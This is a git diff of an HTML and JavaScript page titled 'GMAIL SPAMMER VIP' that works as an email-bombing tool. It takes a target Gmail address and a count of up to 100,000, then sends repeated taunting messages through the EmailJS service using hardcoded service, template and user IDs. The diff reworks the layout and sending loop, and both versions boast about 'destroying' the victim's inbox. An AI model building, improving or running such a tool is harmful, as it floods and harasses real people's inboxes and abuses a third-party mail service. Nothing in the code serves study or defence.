@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GMAIL SPAMMER VIPP</title>
+    <title>GMAIL SPAMMER VIP</title>
     <link href="https://fonts.googleapis.com/css2?family=Eczar:wght@400;600;700&display=swap" rel="stylesheet">
     <style>
         * {
@@ -13,112 +13,157 @@
         }
 
         body {
-            background: #000000;
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
+            background: #000;
+            font-family: Arial, sans-serif;
             overflow-x: hidden;
         }
 
+        /* Intro Screen */
+        .intro-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            transition: all 2s ease;
+        }
+
+        .intro-image {
+            width: 80%;
+            max-width: 500px;
+            height: auto;
+            border-radius: 20px;
+            border: 5px solid #ff0000;
+            box-shadow: 0 0 50px #ff0000;
+            animation: spin 3s linear infinite, glow 2s ease-in-out infinite alternate;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg) scale(1); }
+            50% { transform: rotate(180deg) scale(1.1); }
+            100% { transform: rotate(360deg) scale(1); }
+        }
+
+        @keyframes glow {
+            0% { box-shadow: 0 0 30px #ff0000; }
+            100% { box-shadow: 0 0 60px #ff0000, 0 0 80px #ff0000; }
+        }
+
+        /* Mini Icon */
+        .mini-icon {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            width: 60px;
+            height: 60px;
+            border-radius: 50%;
+            border: 2px solid #ff0000;
+            box-shadow: 0 0 20px #ff0000;
+            animation: miniSpin 4s linear infinite, miniGlow 1.5s ease-in-out infinite alternate;
+            z-index: 999;
+        }
+
+        @keyframes miniSpin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes miniGlow {
+            0% { box-shadow: 0 0 10px #ff0000; }
+            100% { box-shadow: 0 0 25px #ff0000, 0 0 35px #ff0000; }
+        }
+
+        /* Main Content */
+        .main-content {
+            display: none;
+            min-height: 100vh;
+            padding: 20px;
+        }
+
         .container {
-            background: rgba(0, 0, 0, 0.95);
-            border: 4px solid #ff0000;
+            background: rgba(0, 0, 0, 0.9);
+            border: 3px solid #ff0000;
             border-radius: 15px;
             padding: 30px;
-            box-shadow: 0 0 60px #ff0000;
-            max-width: 700px;
-            width: 95%;
-            text-align: center;
-            position: relative;
+            max-width: 800px;
+            margin: 0 auto;
+            box-shadow: 0 0 40px rgba(255, 0, 0, 0.5);
         }
 
         .title {
             color: #ff0000;
-            font-size: 4em;
-            font-weight: 700;
-            text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000;
+            font-size: 48px;
+            font-weight: bold;
+            text-align: center;
             margin-bottom: 10px;
-            text-transform: uppercase;
-            letter-spacing: 4px;
+            text-shadow: 2px 2px 10px rgba(255, 0, 0, 0.8);
             font-family: 'Eczar', serif;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
-            50% { text-shadow: 0 0 40px #ff0000, 0 0 80px #ff0000, 0 0 100px #ff0000; }
-            100% { text-shadow: 0 0 30px #ff0000, 0 0 60px #ff0000; }
+            letter-spacing: 3px;
         }
 
         .credit {
             color: #ff0000;
-            font-size: 1.3em;
-            margin-bottom: 40px;
-            text-shadow: 0 0 15px #ff0000;
-            font-family: 'Courier New', monospace;
+            font-size: 18px;
+            text-align: center;
+            margin-bottom: 30px;
+            text-shadow: 1px 1px 5px rgba(255, 0, 0, 0.6);
             font-weight: bold;
-            letter-spacing: 2px;
         }
 
         .form-group {
             margin-bottom: 20px;
-            text-align: left;
         }
 
         label {
             display: block;
             color: #ff0000;
             margin-bottom: 8px;
-            font-size: 1.1em;
-            text-shadow: 0 0 10px #ff0000;
-            font-family: 'Courier New', monospace;
             font-weight: bold;
+            font-size: 16px;
         }
 
         input[type="email"],
         input[type="number"] {
             width: 100%;
-            padding: 15px;
+            padding: 12px;
             border: 2px solid #ff0000;
             border-radius: 8px;
-            background: #000000;
-            color: #ff0000;
-            font-size: 1.1em;
-            box-shadow: 0 0 20px #ff0000;
-            transition: all 0.3s ease;
-            font-family: 'Courier New', monospace;
+            background: #111;
+            color: #fff;
+            font-size: 16px;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
         }
 
-        input[type="email"]:focus,
-        input[type="number"]:focus {
+        input:focus {
             outline: none;
-            box-shadow: 0 0 30px #ff0000;
-            transform: scale(1.02);
+            box-shadow: 0 0 15px rgba(255, 0, 0, 0.6);
         }
 
         .spam-btn {
+            width: 100%;
+            padding: 15px;
             background: linear-gradient(45deg, #ff0000, #cc0000);
-            color: #000000;
+            color: #000;
             border: none;
-            padding: 20px 40px;
-            font-size: 1.4em;
-            font-weight: bold;
             border-radius: 8px;
+            font-size: 20px;
+            font-weight: bold;
             cursor: pointer;
+            margin: 20px 0;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
             transition: all 0.3s ease;
-            box-shadow: 0 0 30px #ff0000;
             text-transform: uppercase;
             letter-spacing: 2px;
-            margin: 25px 0;
-            width: 100%;
-            font-family: 'Eczar', serif;
         }
 
         .spam-btn:hover {
-            transform: scale(1.05);
-            box-shadow: 0 0 50px #ff0000;
-            background: linear-gradient(45deg, #ff3333, #ff0000);
+            transform: scale(1.02);
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.8);
         }
 
         .spam-btn:active {
@@ -126,351 +171,242 @@
         }
 
         .terminal {
-            background: #000000;
+            background: #111;
             border: 2px solid #ff0000;
             border-radius: 8px;
             padding: 20px;
-            margin-top: 25px;
-            text-align: left;
-            height: 350px;
+            height: 300px;
             overflow-y: auto;
-            color: #ff0000;
+            color: #00ff00;
             font-family: 'Courier New', monospace;
-            box-shadow: inset 0 0 20px #ff0000;
+            font-size: 14px;
+            box-shadow: inset 0 0 20px rgba(255, 0, 0, 0.2);
         }
 
         .terminal-line {
-            margin-bottom: 6px;
-            animation: typewriter 0.1s ease-in;
-            text-shadow: 0 0 5px #ff0000;
+            margin-bottom: 5px;
+            animation: fadeIn 0.3s ease;
         }
 
-        @keyframes typewriter {
+        @keyframes fadeIn {
             from { opacity: 0; }
             to { opacity: 1; }
         }
 
-        .success { color: #00ff00; text-shadow: 0 0 5px #00ff00; }
-        .error { color: #ff0000; text-shadow: 0 0 5px #ff0000; }
-        .warning { color: #ffff00; text-shadow: 0 0 5px #ffff00; }
-        .info { color: #00ffff; text-shadow: 0 0 5px #00ffff; }
+        .success { color: #00ff00; }
+        .error { color: #ff0000; }
+        .warning { color: #ffff00; }
+        .info { color: #00ffff; }
 
-        .flames {
+        .fire-effect {
             position: fixed;
-            top: 0;
+            bottom: 0;
             left: 0;
             width: 100%;
-            height: 100%;
+            height: 100px;
+            background: linear-gradient(transparent, rgba(255, 0, 0, 0.3));
             pointer-events: none;
             z-index: -1;
         }
 
-        .flame {
-            position: absolute;
-            bottom: 0;
-            background: linear-gradient(transparent, #ff0000);
-            border-radius: 50% 50% 0 0;
-            animation: burn 3s ease-in-out infinite;
-        }
-
-        @keyframes burn {
-            0%, 100% { 
-                opacity: 0.3;
-                transform: scaleY(1);
+        /* Responsive */
+        @media (max-width: 768px) {
+            .title {
+                font-size: 36px;
             }
-            50% { 
-                opacity: 0.6;
-                transform: scaleY(1.2);
+            
+            .container {
+                padding: 20px;
+                margin: 10px;
             }
-        }
-
-        .glitch {
-            position: relative;
-            display: inline-block;
-        }
-
-        .glitch::before,
-        .glitch::after {
-            content: attr(data-text);
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-        }
-
-        .glitch::before {
-            animation: glitch-1 0.5s infinite linear alternate-reverse;
-            color: #00ffff;
-            z-index: -1;
-        }
-
-        .glitch::after {
-            animation: glitch-2 0.5s infinite linear alternate-reverse;
-            color: #ff00ff;
-            z-index: -2;
-        }
-
-        @keyframes glitch-1 {
-            0% { transform: translate(0); }
-            20% { transform: translate(-2px, 2px); }
-            40% { transform: translate(-2px, -2px); }
-            60% { transform: translate(2px, 2px); }
-            80% { transform: translate(2px, -2px); }
-            100% { transform: translate(0); }
-        }
-
-        @keyframes glitch-2 {
-            0% { transform: translate(0); }
-            20% { transform: translate(2px, 2px); }
-            40% { transform: translate(2px, -2px); }
-            60% { transform: translate(-2px, 2px); }
-            80% { transform: translate(-2px, -2px); }
-            100% { transform: translate(0); }
+            
+            .mini-icon {
+                width: 40px;
+                height: 40px;
+            }
         }
     </style>
 </head>
 <body>
-    <div class="flames" id="flames"></div>
-    
-    <div class="container">
-        <h1 class="title glitch" data-text="GMAIL SPAMMER VIPP">GMAIL SPAMMER VIPP</h1>
-        <div class="credit">🔥 CREATED BY KANG DAFFA 🔥</div>
+    <!-- Intro Screen -->
+    <div class="intro-screen" id="introScreen">
+        <img src="https://files.catbox.moe/agmwj4.jpg" alt="Kang Daffa" class="intro-image">
+    </div>
+
+    <!-- Mini Icon -->
+    <img src="https://files.catbox.moe/agmwj4.jpg" alt="Kang Daffa" class="mini-icon" id="miniIcon" style="display: none;">
+
+    <!-- Main Content -->
+    <div class="main-content" id="mainContent">
+        <div class="fire-effect"></div>
         
-        <form id="spamForm">
-            <div class="form-group">
-                <label for="email">TARGET GMAIL:</label>
-                <input type="email" id="email" placeholder="target@gmail.com" required>
-            </div>
+        <div class="container">
+            <h1 class="title">GMAIL SPAMMER VIP</h1>
+            <div class="credit">CREATED BY KANG DAFFA</div>
             
-            <div class="form-group">
-                <label for="count">SPAM COUNT (1-100000):</label>
-                <input type="number" id="count" placeholder="1000" min="1" max="100000" required>
-            </div>
+            <form id="spamForm">
+                <div class="form-group">
+                    <label for="email">TARGET GMAIL:</label>
+                    <input type="email" id="email" placeholder="example@gmail.com" required>
+                </div>
+                
+                <div class="form-group">
+                    <label for="count">HOW MANY SPAM:</label>
+                    <input type="number" id="count" placeholder="100" min="1" max="100000" required>
+                </div>
+                
+                <button type="submit" class="spam-btn">START SPAMMING</button>
+            </form>
             
-            <button type="submit" class="spam-btn">⚡ START MASS SPAM ⚡</button>
-        </form>
-        
-        <div class="terminal" id="terminal">
-            <div class="terminal-line info">[SYSTEM] GMAIL SPAMMER VIPP ACTIVATED</div>
-            <div class="terminal-line info">[SYSTEM] ULTRA FAST MODE ENABLED</div>
-            <div class="terminal-line warning">[WARNING] MASS SPAMMING TOOL - USE RESPONSIBLY</div>
-            <div class="terminal-line info">[READY] Enter target and prepare for destruction</div>
+            <div class="terminal" id="terminal">
+                <div class="terminal-line info">System ready...</div>
+                <div class="terminal-line info">Gmail Spammer VIP activated</div>
+                <div class="terminal-line warning">Use responsibly!</div>
+            </div>
         </div>
     </div>
 
-    <!-- EmailJS SDK -->
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
     
     <script>
-        // Initialize EmailJS
-        (function() {
-            emailjs.init("H7WlzLgZwqVAqRG2M");
-        })();
-
-        // Create animated flames
-        function createFlames() {
-            const flamesContainer = document.getElementById('flames');
-            for (let i = 0; i < 20; i++) {
-                const flame = document.createElement('div');
-                flame.className = 'flame';
-                const width = Math.random() * 100 + 50;
-                const height = Math.random() * 200 + 100;
-                const left = Math.random() * 100;
-                const delay = Math.random() * 3;
-                
-                flame.style.width = `${width}px`;
-                flame.style.height = `${height}px`;
-                flame.style.left = `${left}%`;
-                flame.style.animationDelay = `${delay}s`;
-                flame.style.opacity = Math.random() * 0.5 + 0.2;
-                
-                flamesContainer.appendChild(flame);
-            }
-        }
-
-        // Email configuration
+        // EmailJS setup
+        emailjs.init("H7WlzLgZwqVAqRG2M");
+        
         const emailConfig = {
             serviceID: 'service_93wskl6',
             templateID: 'template_wtbthp2',  
             userID: 'H7WlzLgZwqVAqRG2M'
         };
 
-        // ULTRA FAST email sending
-        async function sendMassSpam(targetEmail, messageCount) {
+        // Handle intro animation
+        setTimeout(() => {
+            const introScreen = document.getElementById('introScreen');
+            const miniIcon = document.getElementById('miniIcon');
+            const mainContent = document.getElementById('mainContent');
+            
+            // Shrink intro to mini icon
+            introScreen.style.transition = 'all 1.5s ease';
+            introScreen.style.transform = 'scale(0.1) translate(-450px, 200px)';
+            introScreen.style.opacity = '0';
+            
+            // Show mini icon and main content
+            setTimeout(() => {
+                introScreen.style.display = 'none';
+                miniIcon.style.display = 'block';
+                mainContent.style.display = 'block';
+            }, 1500);
+            
+        }, 5000); // 5 second intro
+
+        // Fast spam function
+        async function sendSpam(targetEmail, messageCount) {
             const terminal = document.getElementById('terminal');
             let successCount = 0;
-            let failedCount = 0;
             
-            const startLine = document.createElement('div');
-            startLine.className = 'terminal-line warning';
-            startLine.textContent = `[LAUNCH] MASS SPAM INITIATED: ${messageCount} messages to ${targetEmail}`;
-            terminal.appendChild(startLine);
-
-            // Send emails in parallel batches for maximum speed
-            const batchSize = 5;
-            const totalBatches = Math.ceil(messageCount / batchSize);
+            terminal.innerHTML += `<div class="terminal-line warning">Starting spam attack: ${messageCount} messages to ${targetEmail}</div>`;
             
-            for (let batch = 0; batch < totalBatches; batch++) {
-                const batchPromises = [];
-                const batchStart = batch * batchSize + 1;
-                const batchEnd = Math.min((batch + 1) * batchSize, messageCount);
-                
-                // Create batch of email promises
-                for (let i = batchStart; i <= batchEnd; i++) {
-                    batchPromises.push(sendSingleSpam(targetEmail, i));
-                }
-                
-                // Execute batch in parallel
+            // Send emails in quick succession
+            for (let i = 1; i <= messageCount; i++) {
                 try {
-                    const batchResults = await Promise.allSettled(batchPromises);
+                    const templateParams = {
+                        to_email: targetEmail,
+                        from_name: '@KANGDAFFA',
+                        message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
+                        subject: `SPAM ${i} - @KANGDAFFA`,
+                        reply_to: 'gojah58@gmail.com'
+                    };
                     
-                    // Process results
-                    batchResults.forEach((result, index) => {
-                        const messageNum = batchStart + index;
-                        if (result.status === 'fulfilled' && result.value) {
-                            successCount++;
-                            if (successCount % 50 === 0 || successCount <= 10) {
-                                const sentLine = document.createElement('div');
-                                sentLine.className = 'terminal-line success';
-                                sentLine.textContent = `[SPAMMED] ${targetEmail} - Message ${messageNum}: "YOUR GMAIL GOT SPAMMED BY @KANGDAFFA"`;
-                                terminal.appendChild(sentLine);
-                            }
-                        } else {
-                            failedCount++;
-                        }
-                    });
+                    await emailjs.send(
+                        emailConfig.serviceID, 
+                        emailConfig.templateID, 
+                        templateParams, 
+                        emailConfig.userID
+                    );
                     
-                    // Progress update
-                    if (batch % 10 === 0 || batch === totalBatches - 1) {
-                        const progress = Math.round(((batch + 1) / totalBatches) * 100);
-                        const progressLine = document.createElement('div');
-                        progressLine.className = 'terminal-line info';
-                        progressLine.textContent = `[PROGRESS] ${progress}% - ${successCount} sent, ${failedCount} failed`;
-                        terminal.appendChild(progressLine);
+                    successCount++;
+                    
+                    // Show progress every 10 messages or for first few
+                    if (i % 10 === 0 || i <= 5) {
+                        terminal.innerHTML += `<div class="terminal-line success">Sent ${i}/${messageCount}: ${targetEmail}</div>`;
+                        terminal.scrollTop = terminal.scrollHeight;
                     }
                     
-                    terminal.scrollTop = terminal.scrollHeight;
-                    
-                    // Minimal delay between batches
-                    if (batch < totalBatches - 1) {
-                        await new Promise(resolve => setTimeout(resolve, 100));
+                    // Very short delay to make it fast but not get blocked
+                    if (i < messageCount) {
+                        await new Promise(resolve => setTimeout(resolve, 500));
                     }
                     
-                } catch (batchError) {
-                    const errorLine = document.createElement('div');
-                    errorLine.className = 'terminal-line error';
-                    errorLine.textContent = `[BATCH ERROR] Batch ${batch + 1}: ${batchError.message}`;
-                    terminal.appendChild(errorLine);
+                } catch (error) {
+                    terminal.innerHTML += `<div class="terminal-line error">Failed to send message ${i}</div>`;
                 }
             }
             
-            return { success: successCount, failed: failedCount };
+            return successCount;
         }
 
-        // Single email send function
-        async function sendSingleSpam(targetEmail, messageNum) {
-            try {
-                const templateParams = {
-                    to_email: targetEmail,
-                    from_name: '@KANGDAFFA',
-                    message: 'YOUR GMAIL GOT SPAMMED BY @KANGDAFFA',
-                    subject: `SPAMMED BY @KANGDAFFA - ${messageNum}`,
-                    reply_to: 'gojah58@gmail.com'
-                };
-                
-                await emailjs.send(
-                    emailConfig.serviceID, 
-                    emailConfig.templateID, 
-                    templateParams, 
-                    emailConfig.userID
-                );
-                
-                return true;
-            } catch (error) {
-                return false;
-            }
-        }
-
-        // Form submission
+        // Form handler
         document.getElementById('spamForm').addEventListener('submit', async function(e) {
             e.preventDefault();
             
             const targetEmail = document.getElementById('email').value;
             const messageCount = parseInt(document.getElementById('count').value);
+            const button = this.querySelector('button');
             const terminal = document.getElementById('terminal');
-            const button = document.querySelector('.spam-btn');
-
-            // Clear terminal
-            terminal.innerHTML = `
-                <div class="terminal-line info">[SYSTEM] GMAIL SPAMMER VIPP - MASS ATTACK MODE</div>
-                <div class="terminal-line warning">[LAUNCH] Preparing to spam ${messageCount} messages...</div>
-            `;
-
-            // Validation
+            
             if (!targetEmail.includes('@gmail.com')) {
-                const errorLine = document.createElement('div');
-                errorLine.className = 'terminal-line error';
-                errorLine.textContent = '[ERROR] Target must be Gmail address';
-                terminal.appendChild(errorLine);
+                terminal.innerHTML += `<div class="terminal-line error">Must be a Gmail address!</div>`;
                 return;
             }
-
-            if (messageCount > 100000 || messageCount < 1) {
-                const errorLine = document.createElement('div');
-                errorLine.className = 'terminal-line error';
-                errorLine.textContent = '[ERROR] Count must be 1-100000';
-                terminal.appendChild(errorLine);
+            
+            if (messageCount > 100000) {
+                terminal.innerHTML += `<div class="terminal-line error">Max 100000 messages!</div>`;
                 return;
             }
-
+            
             // Disable button
             button.disabled = true;
-            button.textContent = '☠️ MASS SPAMMING IN PROGRESS...';
-            button.style.background = 'linear-gradient(45deg, #666, #333)';
-
-            // Start mass spam attack
+            button.textContent = 'SPAMMING...';
+            
+            // Clear terminal and show start message
+            terminal.innerHTML = `<div class="terminal-line info">Starting mass spam attack...</div>`;
+            
             const startTime = Date.now();
-            const result = await sendMassSpam(targetEmail, messageCount);
+            const successCount = await sendSpam(targetEmail, messageCount);
             const endTime = Date.now();
-            const duration = ((endTime - startTime) / 1000).toFixed(1);
-
+            const timeTaken = ((endTime - startTime) / 1000).toFixed(1);
+            
+            // Show results
+            terminal.innerHTML += `
+                <div class="terminal-line success">=== SPAM COMPLETE ===</div>
+                <div class="terminal-line info">Sent: ${successCount}/${messageCount} messages</div>
+                <div class="terminal-line info">Time: ${timeTaken} seconds</div>
+                <div class="terminal-line warning">${targetEmail} got destroyed by @KANGDAFFA!</div>
+            `;
+            
+            terminal.scrollTop = terminal.scrollHeight;
+            
             // Re-enable button
             button.disabled = false;
-            button.textContent = '⚡ START MASS SPAM ⚡';
-            button.style.background = 'linear-gradient(45deg, #ff0000, #cc0000)';
-
-            // Final results
-            const finalLine = document.createElement('div');
-            finalLine.className = 'terminal-line success';
-            finalLine.innerHTML = `
-                [MISSION COMPLETE]<br>
-                ✅ ${result.success} messages sent successfully<br>
-                ❌ ${result.failed} messages failed<br>
-                ⏱️ Total time: ${duration} seconds<br>
-                💀 ${targetEmail} has been destroyed by @KANGDAFFA
-            `;
-            terminal.appendChild(finalLine);
-            terminal.scrollTop = terminal.scrollHeight;
-
-            // Celebration effect
-            document.body.style.animation = 'none';
-            setTimeout(() => {
-                document.body.style.boxShadow = '0 0 200px #ff0000';
-            }, 100);
+            button.textContent = 'START SPAMMING';
         });
 
-        // Initialize
-        createFlames();
+        // Add some random terminal messages for effect
+        const messages = [
+            "System armed and ready",
+            "Gmail API connected", 
+            "Spam engine warmed up",
+            "Ready to destroy some inboxes",
+            "@KANGDAFFA power activated"
+        ];
         
-        // Add startup message
-        setTimeout(() => {
+        setInterval(() => {
             const terminal = document.getElementById('terminal');
-            const readyLine = document.createElement('div');
-            readyLine.className = 'terminal-line success';
-            readyLine.textContent = '[READY] System armed - Maximum destruction enabled';
-            terminal.appendChild(readyLine);
-        }, 1500);
+            if (terminal.children.length < 10) {
+                const randomMsg = messages[Math.floor(Math.random() * messages.length)];
+                terminal.innerHTML += `<div class="terminal-line info">${randomMsg}</div>`;
+                terminal.scrollTop = terminal.scrollHeight;
+            }
+        }, 8000);
     </script>
 </body>
-</html>
+    </html>
